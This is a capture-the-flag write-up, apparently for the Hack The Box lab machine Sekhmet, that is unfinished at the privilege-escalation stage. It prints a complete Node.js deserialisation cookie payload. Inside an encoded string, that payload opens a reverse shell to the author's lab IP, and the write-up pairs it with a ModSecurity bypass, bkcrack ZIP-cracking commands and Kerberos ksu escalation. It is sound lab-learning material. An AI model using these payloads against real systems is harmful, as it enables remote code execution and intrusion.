# Sekhmet (AD)

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

When trying to head to the webpage, we need to use the `www.windcorp.htb`domain.

### Windcorp.htb

The page displays a common corporate website:

<figure><img src="../../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

Looking through the web page, we can take note of some names which might be important:

<figure><img src="../../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

This website might have other subdomains, so I began fuzzing with `gobuster` and `wfuzz`. Found one at `portal.windcorp.htb`.

<figure><img src="../../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>

We can add that to the `/etc/hosts` file and enumerate there.

### Portal Login

At the new domain, we are greeted by a login page.

<figure><img src="../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

I attempted to login with `admin:admin`, and it worked!

<figure><img src="../../../.gitbook/assets/image (432).png" alt=""><figcaption><p><br></p></figcaption></figure>

When proxying the traffic, we can view an interesting cookie.

```http
GET / HTTP/1.1
Host: portal.windcorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://portal.windcorp.htb/
Connection: close
Cookie: app=s%3Agpu_VEXOnSx4-DXarW50akMCYR8ZSm9_.f89t1kW2npm6XUdPPPGRWt8oGUSWc%2FfSx9Dy%2BNDPKbI; profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2NzExMDc1NzU3NDR9
Upgrade-Insecure-Requests: 1
If-None-Match: W/"56c-p/i7GTqmqUq+k/bjnk4SFBcSAkI"
```

The `profile` cookie looked like a JWT token, but it was not.

<figure><img src="../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

Also, the website was **powered by Express,** which might be useful in determining possible exploits regarding these cookies.&#x20;

### ModSec RCE

When trying to fuzz the login page with some SQL Injection payloads, I got this error.

<figure><img src="../../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

It seems that ModSec is the WAF used to protect this webpage. Odd that they would include this. Research on some cookie related exploits for Mod Security revealed a few good articles.

{% embed url="https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/" %}

This article states how there's a DoS condition possible with Mod Security through the use of a second `=` sign within the cookie parameter.&#x20;

<figure><img src="../../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

The PoC also states that it's possible to inject payloads through this.

<figure><img src="../../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

So with this website, so far we know that this is running an Express framework, and the cookie is the point of injection. Doing research on cookie and Express related vulnerabilities led me to this article:

{% embed url="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" %}

There might be a deserialisation exploit with the cookies here, and ModSec was the hint to use the cookies.&#x20;

We can follow the tutorial exactly to create the payload. First we can generate the shell using `nodejsshell.py` provided by the article and use base64 to encode it.&#x20;

<figure><img src="../../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

Then, we would need to append something at the back of the cookie **to make sure we bypass ModSec and let the cookie pass through**. This would allow for the RCE to work. This was the final request sent via Burpsuite:

```http
GET / HTTP/1.1
Host: portal.windcorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://portal.windcorp.htb/
Connection: close
Cookie: app=s%3A-wO6tgy8NZeUVcdkDvhejiUAFnjWV4fN.IDH27QTkcSDT1pCjEuSFu7qys857BPvs2JylB3izp2g; profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw0OCw0Niw0OSw0OCw0Niw0OSw1Miw0Niw1MCw1NywzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1MSw1MSw1MSw1MSwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifSAg=profile
Upgrade-Insecure-Requests: 1
If-None-Match: W/"570-pCEHA1bFjNPlboV91WiNzCFs0wY"

```

I managed to retrieve a shell using this method as a `webster` user after sending this request.&#x20;

<figure><img src="../../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

## Webserver Foothold

This machine was supposed to be a Windows machine, but I ended up within a Linux host? I found that incredibly odd. This confirms that this box has multiple hosts on it, with different operating systems and is probably Active Directory related.

### ZIP Cracking

Anyways, when viewing the home directory, we see this backup.zip file:

<figure><img src="../../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

When trying to unzip it, we can see that it is password protected and that the `/etc/passwd` file si within it. There are also a ton of other files related to Active Directory, such as GPOs and Kerberos configurations.

<figure><img src="../../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

I found it incredibly odd that there was a random zip file here. Trying to crack the hash didn't work for me as well. Transferring the file back to my machine, we can use `7z l -slt` to view the technical information of the zip file.

<figure><img src="../../../.gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>

This was using ZipCrypto Deflate, meaning that the `bkcrack` exploit would work on this due to the legacy encryption used.

{% embed url="https://github.com/kimci86/bkcrack" %}

To exploit this:

```bash
# create a new zip of the passwd file
cp /etc/passwd .
zip passwd.zip passwd
# use bkcrack to crack the keys
./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd
# use the codes found to create a new zip file with a known password
./bkcrack -C backup.zip -U cracked.zip password -k <code1> <code2> <code3>
```

This should create a new zip file that we can open easily.&#x20;

<figure><img src="../../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

Now, we can take a proper look at the files within this zip folder.&#x20;

### File Enum

Within the zip file, there were tons of configuration files to look through. Naturally, the `/var/lib/sss/db` folder caught my attention first.&#x20;

Within it, there were some ldb files.

<figure><img src="../../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

Within the cache\_windcorp.htb.ldb file, I found a credential after using `strings` on it. The user was `ray.duncan`.

<figure><img src="../../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

And he has a hashed password within this folder.

<figure><img src="../../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

This hash can be cracked easily:

<figure><img src="../../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

So now we have SOME credentails. Doing further enumeration on the files reveals that there are other networks present on this machine.

<figure><img src="../../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

So 192.168.0.2 had the KDC (and hence DC) of this machine.  Within the other db files, there was mention of a `hope.windcorp.htb` domain.

<figure><img src="../../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

### Ray.Duncan

Within the machine, we can attempt to SSH in as ray.duncan@windcorp.htb (yes that's his user).

<figure><img src="../../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

Now, we are on the same webserver host with persistence this time. Because of all of the Kerberos stuff and confirmation that this is an AD-related machine, we can request and cache a ticket via `kinit`. Searching on how to use a ticket in Linux led me to `ksu`, which basically is `su` with Kerberos.

With these commands, we can become root on this container and capture the user flag.

<figure><img src="../../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

Rest of this is WIP! Really long machine.

## Privilege Escalation

### Domain Enum
